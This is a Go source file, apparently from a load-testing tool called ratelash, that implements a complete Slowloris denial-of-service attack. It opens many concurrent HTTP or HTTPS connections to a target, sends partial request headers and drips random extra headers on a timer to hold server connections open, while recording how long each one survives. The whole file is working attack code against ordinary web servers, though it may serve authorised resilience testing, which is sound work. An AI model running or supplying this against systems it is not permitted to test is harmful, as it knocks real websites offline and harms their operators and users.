package slowloris

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"math/rand/v2"
	"net"
	"net/url"
	"sync"
	"time"

	"github.com/conantorreswf/ratelash/internal/metrics"
)

type Options struct {
	URL             string
	Connections     int
	HeaderInterval  time.Duration
	Hold            time.Duration
	DialTimeout     time.Duration
	WriteTimeout    time.Duration
	InsecureSkipTLS bool
}

func Run(ctx context.Context, opts Options) (*metrics.ConnReport, error) {
	if opts.Connections < 1 {
		opts.Connections = 1
	}
	if opts.HeaderInterval <= 0 {
		opts.HeaderInterval = 10 * time.Second
	}
	if opts.Hold <= 0 {
		opts.Hold = 120 * time.Second
	}
	if opts.DialTimeout <= 0 {
		opts.DialTimeout = 5 * time.Second
	}
	if opts.WriteTimeout <= 0 {
		opts.WriteTimeout = 5 * time.Second
	}

	u, err := url.Parse(opts.URL)
	if err != nil {
		return nil, fmt.Errorf("slowloris: invalid url: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return nil, fmt.Errorf("slowloris: scheme must be http or https")
	}
	host := u.Host
	if _, _, splitErr := net.SplitHostPort(host); splitErr != nil {
		if u.Scheme == "https" {
			host = host + ":443"
		} else {
			host = host + ":80"
		}
	}
	path := u.Path
	if path == "" {
		path = "/"
	}

	cc := metrics.NewConnCollector()
	start := time.Now()

	var wg sync.WaitGroup
	for i := 0; i < opts.Connections; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			holdOne(ctx, id, host, path, u, opts, cc)
		}(i)

		// stagger slightly to avoid all dialing at once
		select {
		case <-ctx.Done():
			break
		case <-time.After(time.Duration(rand.Int64N(10)) * time.Millisecond):
		}
	}
	wg.Wait()
	return cc.Finalize(time.Since(start)), nil
}

func holdOne(ctx context.Context, id int, host, path string, u *url.URL, opts Options, cc *metrics.ConnCollector) {
	cc.Attempt()

	dialer := &net.Dialer{Timeout: opts.DialTimeout}
	var conn net.Conn
	var err error
	if u.Scheme == "https" {
		conn, err = tls.DialWithDialer(dialer, "tcp", host, &tls.Config{
			InsecureSkipVerify: opts.InsecureSkipTLS,
			ServerName:         hostname(host),
		})
	} else {
		conn, err = dialer.DialContext(ctx, "tcp", host)
	}
	if err != nil {
		cc.Error(classifyErr(err))
		return
	}
	defer conn.Close()
	cc.Established()

	openedAt := time.Now()
	initial := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: ratelash-slowloris\r\nAccept: */*\r\n",
		path, hostname(host))
	_ = conn.SetWriteDeadline(time.Now().Add(opts.WriteTimeout))
	n, err := conn.Write([]byte(initial))
	cc.AddBytes(int64(n))
	if err != nil {
		cc.DroppedByServer(time.Since(openedAt))
		cc.Error("initial-write:" + classifyErr(err))
		return
	}

	deadline := time.NewTimer(opts.Hold)
	defer deadline.Stop()
	ticker := time.NewTicker(opts.HeaderInterval)
	defer ticker.Stop()

	headerIdx := 0
	for {
		select {
		case <-ctx.Done():
			cc.DroppedClient(time.Since(openedAt))
			return
		case <-deadline.C:
			cc.DroppedClient(time.Since(openedAt))
			return
		case <-ticker.C:
			drip := fmt.Sprintf("X-Keep-Alive-%d: %x\r\n", headerIdx, rand.Uint64())
			headerIdx++
			_ = conn.SetWriteDeadline(time.Now().Add(opts.WriteTimeout))
			n, err := conn.Write([]byte(drip))
			cc.AddBytes(int64(n))
			if err != nil {
				cc.DroppedByServer(time.Since(openedAt))
				cc.Error("drip-write:" + classifyErr(err))
				return
			}
			// peek for server close: tiny read with short deadline. If we
			// get EOF or any data (e.g. 408/400 response) the server has
			// stopped tolerating us.
			_ = conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
			var probe [1]byte
			if _, rerr := conn.Read(probe[:]); rerr != nil {
				var ne net.Error
				if errors.As(rerr, &ne) && ne.Timeout() {
					// expected — server hasn't responded yet
				} else {
					cc.DroppedByServer(time.Since(openedAt))
					cc.Error("drip-eof:" + classifyErr(rerr))
					return
				}
			} else {
				// server actually sent us something — likely the response
				cc.DroppedByServer(time.Since(openedAt))
				cc.Error("drip-resp")
				return
			}
		}
	}
}

func hostname(h string) string {
	host, _, err := net.SplitHostPort(h)
	if err != nil {
		return h
	}
	return host
}

func classifyErr(err error) string {
	if err == nil {
		return ""
	}
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return "timeout"
	}
	s := err.Error()
	switch {
	case contains(s, "refused"):
		return "refused"
	case contains(s, "reset"):
		return "reset"
	case contains(s, "broken pipe"):
		return "broken-pipe"
	case contains(s, "closed"):
		return "closed"
	default:
		return "other"
	}
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
